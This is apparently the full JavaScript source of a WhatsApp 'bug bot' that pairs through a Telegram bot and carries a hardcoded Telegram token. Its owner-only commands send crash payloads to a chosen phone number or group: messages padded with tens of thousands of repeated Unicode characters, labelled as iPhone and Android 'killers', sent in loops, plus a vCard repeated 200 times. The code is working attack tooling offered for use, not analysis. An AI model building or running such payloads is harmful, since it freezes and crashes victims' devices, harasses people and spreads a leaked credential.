const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD V3 ELITE",
    owner: "94767475809", 
    prefix: ".",
    isPublic: false 
};

// --- 🌐 WEB SERVER ---
app.get('/', (req, res) => res.send('Nexus Elite System is Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        // --- 🛠️ PAIRING FIX: අලුත්ම Chrome Version එක මෙතන තියෙන්නේ ---
        browser: Browsers.macOS("Desktop"), 
        printQRInTerminal: false,
        syncFullHistory: false
    });

    // --- 🤖 TELEGRAM PAIRING (FIXED) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        if (text && /^\d+$/.test(text) && text.length > 9) {
            const chatId = msg.chat.id;
            try {
                tgBot.sendMessage(chatId, "⏳ *සකසමින් පවතී... කරුණාකර රැඳී සිටින්න.*", { parse_mode: 'Markdown' });
                await delay(2000);
                
                // පේයාරින් කෝඩ් එක ඉල්ලන කොටස
                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                
                tgBot.sendMessage(chatId, `🔥 *YOUR PAIRING CODE:* \`${code}\` \n\nමෙම කේතය ඔබගේ WhatsApp හි Linked Devices හරහා ඇතුළත් කරන්න.`, { parse_mode: 'Markdown' });
            } catch (e) {
                tgBot.sendMessage(chatId, "❌ *වැරදීමක් සිදුවිය!* \nනැවත උත්සාහ කරන්න හෝ බොට් Restart කරන්න.");
                console.error(e);
            }
        }
    });

    // --- 📩 WHATSAPP BUG HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const sender = mek.key.participant || mek.key.remoteJid;
            const isOwner = sender.includes(botConfig.owner) || mek.key.fromMe;
            
            if (!isOwner) return; // Private Mode (ඔයාට විතරයි)

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const text = body.trim().split(/ +/).slice(1).join(" ");
            const target = text + "@s.whatsapp.net";

            // --- 🦠 DEADLY PAYLOADS (10M+ POWER) ---
            const bug1 = "☠️" + "ꦿ".repeat(45000); // Android
            const bug2 = "🔥" + "᥋".repeat(50000); // iOS Killer
            const bug3 = "❄️" + "꠵".repeat(55000); // UI Freeze

            switch (command) {
                case 'menu':
                case 'bug':
                    const menu = `╭───〔 *${botConfig.botName}* 〕───┈
│
│ 🦠 *ELITE BUG SYSTEM (9 MODES)*
│
├ ☠️ *1. .ios1* [number] - iPhone Hard Lag
├ 🔥 *2. .ios2* [number] - iPhone UI Freeze
├ 💀 *3. .kill* [number] - Android Destroyer
├ ❄️ *4. .freeze* [number] - System Lag
├ 📍 *5. .loc* [number] - Location Bug
├ 📇 *6. .vcard* [number] - Contact Crash
├ 🌀 *7. .group* [jid] - Group Destroyer
├ 🧨 *8. .bomb* [number] - Spam Bug
├ 🌌 *9. .the_end* [number] - Total Crash
│
╰─────────────┈
 ⚡ *STATUS:* MASTER ONLY
 👑 *DEV:* SASIYA MD`;

                    await sock.sendMessage(from, { 
                        text: menu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD V3 ELITE BUG",
                                body: "Developed by Sasiya MD",
                                mediaType: 1,
                                thumbnailUrl: "https://telegra.ph/file/a8a183d25667e41793741.jpg", 
                                sourceUrl: "https://nexus-agency.com"
                            }
                        }
                    }, { quoted: mek });
                    break;

                case 'ios1':
                case 'the_end':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🌑 *DEPLOYING SYSTEM WIPE BUG...*" });
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(target, { text: bug1 + bug2 + bug3 });
                        await delay(500);
                    }
                    await sock.sendMessage(from, { text: "💀 *TARGET DESTROYED!*" });
                    break;

                case 'vcard':
                    if (!text) return;
                    const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Nexus Virus\nEND:VCARD'.repeat(200);
                    await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
                    break;
                
                case 'group':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🧨 *GROUP BUG DEPLOYING...*" });
                    for(let i=0; i<8; i++) {
                        await sock.sendMessage(text, { text: bug1 + bug2 });
                    }
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => {
        const { connection, lastDisconnect } = up;
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) startNexus();
        } else if (connection === 'open') {
            console.log('✅ ELITE BUG BOT IS READY!');
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

startNexus();
